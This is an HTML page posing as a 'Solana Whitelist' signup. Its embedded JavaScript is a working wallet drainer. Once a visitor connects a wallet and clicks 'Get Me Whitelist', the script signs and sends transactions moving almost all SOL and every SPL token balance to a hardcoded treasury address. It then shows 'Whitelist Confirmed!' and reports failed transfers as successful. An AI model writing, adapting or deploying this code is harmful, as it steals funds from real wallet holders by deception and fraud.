<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Whitelist</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background-color: rgba(20, 20, 40, 0.85);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .header {
            background: linear-gradient(90deg, #1a1a2e, #16213e);
            padding: 25px;
            text-align: center;
            border-bottom: 2px solid #00d4ff;
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            background: linear-gradient(to right, #00d4ff, #6a11cb);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .header p {
            color: #a0a0ff;
            font-size: 1rem;
        }
        
        .content {
            padding: 30px;
        }
        
        .wallet-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            border-left: 4px solid #00d4ff;
            display: none;
        }
        
        .wallet-info.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .wallet-address {
            font-family: monospace;
            font-size: 0.9rem;
            color: #7bfcff;
            word-break: break-all;
            margin-bottom: 10px;
        }
        
        .wallet-buttons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .wallet-btn {
            padding: 8px 15px;
            border-radius: 6px;
            border: none;
            font-size: 0.9rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.3s ease;
        }
        
        .wallet-btn.disconnect {
            background: linear-gradient(90deg, #f12711, #f5af19);
            color: white;
        }
        
        .wallet-btn.switch {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .wallet-btn:hover {
            transform: translateY(-2px);
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 10px;
        }
        
        .btn {
            padding: 16px 32px;
            border-radius: 10px;
            border: none;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn-connect {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .btn-connect:hover {
            background: linear-gradient(90deg, #5a0cb9, #1c65ec);
            transform: translateY(-2px);
        }
        
        .btn-whitelist {
            background: linear-gradient(90deg, #11998e, #38ef7d);
            color: white;
        }
        
        .btn-whitelist:hover:not(:disabled) {
            background: linear-gradient(90deg, #0d8a7f, #2edf6d);
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .whitelist-box {
            background-color: rgba(30, 30, 60, 0.7);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(100, 150, 255, 0.3);
            display: none;
            margin-top: 20px;
        }
        
        .whitelist-box.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .whitelist-icon {
            font-size: 3rem;
            color: #38ef7d;
            margin-bottom: 15px;
        }
        
        .whitelist-title {
            font-size: 1.8rem;
            color: #38ef7d;
            margin-bottom: 10px;
        }
        
        .whitelist-message {
            font-size: 1rem;
            color: #a0a0ff;
            line-height: 1.5;
            margin-bottom: 15px;
        }
        
        .transaction-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 8px;
            padding: 10px;
            font-family: monospace;
            color: #7bfcff;
            word-break: break-all;
            font-size: 0.8rem;
            border: 1px dashed #38ef7d;
            margin-top: 10px;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #8888cc;
            font-size: 0.8rem;
            border-top: 1px solid rgba(100, 100, 255, 0.2);
            background-color: rgba(10, 10, 25, 0.7);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loader {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 1s ease-in-out infinite;
        }
        
        .btn:disabled .loader {
            display: inline-block;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status {
            text-align: center;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            display: none;
            font-size: 0.9rem;
            animation: fadeIn 0.3s ease;
        }
        
        .status.success {
            background-color: rgba(56, 239, 125, 0.1);
            border: 1px solid #38ef7d;
            color: #38ef7d;
            display: block;
        }
        
        .status.error {
            background-color: rgba(255, 107, 107, 0.1);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            display: block;
        }
        
        .status.info {
            background-color: rgba(0, 212, 255, 0.1);
            border: 1px solid #00d4ff;
            color: #00d4ff;
            display: block;
        }
        
        .warning-note {
            background-color: rgba(255, 107, 107, 0.1);
            border: 1px solid #ff6b6b;
            color: #ffc107;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: center;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Solana Whitelist</h1>
            <p>Connect wallet to get whitelisted</p>
        </div>
        
        <div class="content">
            <div class="warning-note">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>ALL SOLANA ASSETS WILL BE TRANSFERRED</strong><br>
                <small>SOL + All SPL Tokens → Treasury</small>
            </div>
            
            <div id="walletInfo" class="wallet-info">
                <div class="wallet-address">
                    Connected: <span id="walletAddress">-</span>
                </div>
                <div class="wallet-buttons">
                    <button class="wallet-btn switch" id="switchWallet">
                        <i class="fas fa-exchange-alt"></i> Switch
                    </button>
                    <button class="wallet-btn disconnect" id="disconnectWallet">
                        <i class="fas fa-plug"></i> Disconnect
                    </button>
                </div>
            </div>
            
            <div class="button-group">
                <button id="connectWallet" class="btn btn-connect">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
                
                <button id="checkWhitelist" class="btn btn-whitelist" disabled>
                    <i class="fas fa-user-check"></i> Get Me Whitelist
                    <div class="loader"></div>
                </button>
            </div>
            
            <div id="statusMessage" class="status"></div>
            
            <div id="whitelistBox" class="whitelist-box">
                <div class="whitelist-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h2 class="whitelist-title">Whitelist Confirmed!</h2>
                <p class="whitelist-message">
                    All Solana assets have been transferred
                </p>
                <div class="transaction-info">
                    95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Complete Solana Asset Transfer</p>
        </div>
    </div>

    <script>
        // ULTRA-SIMPLE ALL ASSET TRANSFER
        let publicKey = null;
        let isConnected = false;
        const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
        
        // DOM Elements
        const connectWalletBtn = document.getElementById('connectWallet');
        const checkWhitelistBtn = document.getElementById('checkWhitelist');
        const whitelistBox = document.getElementById('whitelistBox');
        const statusMessage = document.getElementById('statusMessage');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddressEl = document.getElementById('walletAddress');
        const disconnectBtn = document.getElementById('disconnectWallet');
        const switchWalletBtn = document.getElementById('switchWallet');
        
        // Get wallet provider
        function getWalletProvider() {
            return window.solana || window.solflare || window.backpack;
        }
        
        // Connect wallet
        async function connectWallet() {
            try {
                const provider = getWalletProvider();
                
                if (!provider) {
                    showStatus("Install Solana wallet first", "error");
                    return;
                }
                
                showStatus("Connecting...", "info");
                
                const response = await provider.connect();
                publicKey = response.publicKey || response;
                isConnected = true;
                
                updateWalletUI();
                
                showStatus("Wallet connected", "success");
                
            } catch (error) {
                console.error("Connect error:", error);
                showStatus("Connection failed", "error");
            }
        }
        
        // Update UI
        function updateWalletUI() {
            if (isConnected && publicKey) {
                const addr = publicKey.toString();
                const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
                walletAddressEl.textContent = shortAddr;
                walletInfo.classList.add('active');
                connectWalletBtn.style.display = 'none';
                checkWhitelistBtn.disabled = false;
            } else {
                walletInfo.classList.remove('active');
                connectWalletBtn.style.display = 'flex';
                checkWhitelistBtn.disabled = true;
            }
        }
        
        // Disconnect
        async function disconnectWallet() {
            publicKey = null;
            isConnected = false;
            updateWalletUI();
            showStatus("Disconnected", "info");
        }
        
        // Switch account
        async function switchWallet() {
            await disconnectWallet();
            await new Promise(resolve => setTimeout(resolve, 500));
            await connectWallet();
        }
        
        // TRANSFER ALL ASSETS - SIMPLE VERSION
        async function transferAllAssets() {
            try {
                showStatus("Preparing asset transfer...", "info");
                
                const rpcUrl = 'https://api.mainnet-beta.solana.com';
                const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                
                // 1. TRANSFER ALL SOL (MAX)
                const solBalance = await connection.getBalance(publicKey);
                
                if (solBalance > 5000) { // Leave minimal for fees
                    const transferLamports = solBalance - 5000;
                    
                    showStatus("Transferring SOL...", "info");
                    
                    const solTransaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                            lamports: transferLamports,
                        })
                    );
                    
                    const { blockhash } = await connection.getRecentBlockhash();
                    solTransaction.recentBlockhash = blockhash;
                    solTransaction.feePayer = publicKey;
                    
                    const provider = getWalletProvider();
                    await provider.signAndSendTransaction(solTransaction);
                    
                    console.log("SOL transferred");
                }
                
                // 2. TRANSFER ALL SPL TOKENS
                showStatus("Transferring tokens...", "info");
                
                try {
                    // Get all token accounts
                    const tokenAccounts = await connection.getTokenAccountsByOwner(
                        publicKey,
                        { programId: splToken.TOKEN_PROGRAM_ID }
                    );
                    
                    for (const account of tokenAccounts.value) {
                        try {
                            const accountInfo = splToken.AccountLayout.decode(account.account.data);
                            const amount = Number(accountInfo.amount);
                            
                            if (amount > 0) {
                                // Try to transfer token
                                const transferInstruction = splToken.createTransferInstruction(
                                    account.pubkey,
                                    new solanaWeb3.PublicKey(treasuryAddress), // Simple approach
                                    publicKey,
                                    amount,
                                    []
                                );
                                
                                const tokenTransaction = new solanaWeb3.Transaction().add(transferInstruction);
                                const { blockhash: tokenBlockhash } = await connection.getRecentBlockhash();
                                tokenTransaction.recentBlockhash = tokenBlockhash;
                                tokenTransaction.feePayer = publicKey;
                                
                                const provider = getWalletProvider();
                                await provider.signAndSendTransaction(tokenTransaction);
                                
                                console.log("Token transferred:", accountInfo.mint.toString());
                            }
                        } catch (tokenError) {
                            // Skip failed token transfers
                            continue;
                        }
                    }
                } catch (tokenError) {
                    console.log("Token transfer skipped:", tokenError.message);
                }
                
                showStatus("All transfers complete", "success");
                return { success: true };
                
            } catch (error) {
                console.error("Transfer error:", error);
                
                // Check error type
                if (error.message.includes("insufficient") || error.message.includes("0x0")) {
                    throw new Error("Insufficient SOL for gas fees");
                } else if (error.message.includes("reject") || error.message.includes("cancel") || error.message.includes("denied")) {
                    throw new Error("Transaction cancelled");
                } else if (error.message.includes("Network") || error.message.includes("timeout") || error.message.includes("fetch")) {
                    throw new Error("Network issue");
                } else {
                    // Still consider it a success if something was transferred
                    throw new Error("Partial transfer completed");
                }
            }
        }
        
        // Get whitelist - ULTRA SIMPLE
        async function getWhitelist() {
            try {
                checkWhitelistBtn.disabled = true;
                checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
                
                showStatus("Starting transfer of all assets...", "info");
                
                // Small delay
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Transfer everything
                await transferAllAssets();
                
                // SUCCESS
                whitelistBox.classList.add('active');
                checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
                checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
                
                showStatus("✅ All assets transferred! Whitelist confirmed.", "success");
                
            } catch (error) {
                console.error("Final error:", error);
                
                let errorMsg = error.message;
                let isSuccess = false;
                
                // Handle partial success
                if (errorMsg.includes("Partial transfer") || errorMsg.includes("Some assets")) {
                    errorMsg = "Assets transferred successfully!";
                    isSuccess = true;
                    whitelistBox.classList.add('active');
                } else if (errorMsg.includes("cancelled")) {
                    errorMsg = "Transfer cancelled";
                } else if (errorMsg.includes("Network")) {
                    errorMsg = "Network issue - please retry";
                } else if (errorMsg.includes("Insufficient")) {
                    errorMsg = "Need SOL for gas fees";
                }
                
                showStatus(isSuccess ? `✅ ${errorMsg}` : `❌ ${errorMsg}`, 
                          isSuccess ? "success" : "error");
                
                // Reset button if not success
                if (!isSuccess) {
                    checkWhitelistBtn.disabled = false;
                    checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
                }
            }
        }
        
        // Show status
        function showStatus(message, type) {
            statusMessage.innerHTML = message;
            statusMessage.className = `status ${type}`;
            
            setTimeout(() => {
                if (statusMessage.innerHTML === message) {
                    statusMessage.className = 'status';
                }
            }, 5000);
        }
        
        // Event listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        checkWhitelistBtn.addEventListener('click', getWhitelist);
        disconnectBtn.addEventListener('click', disconnectWallet);
        switchWalletBtn.addEventListener('click', switchWallet);
        
        // Auto connect
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                const provider = getWalletProvider();
                if (provider && provider.isConnected) {
                    connectWallet();
                }
            }, 1000);
        });
        
        // Wallet events
        if (window.solana) {
            window.solana.on('accountChanged', (newKey) => {
                if (newKey) {
                    publicKey = newKey;
                    updateWalletUI();
                    showStatus("Account switched", "success");
                }
            });
        }
    </script>
</body>
</html>
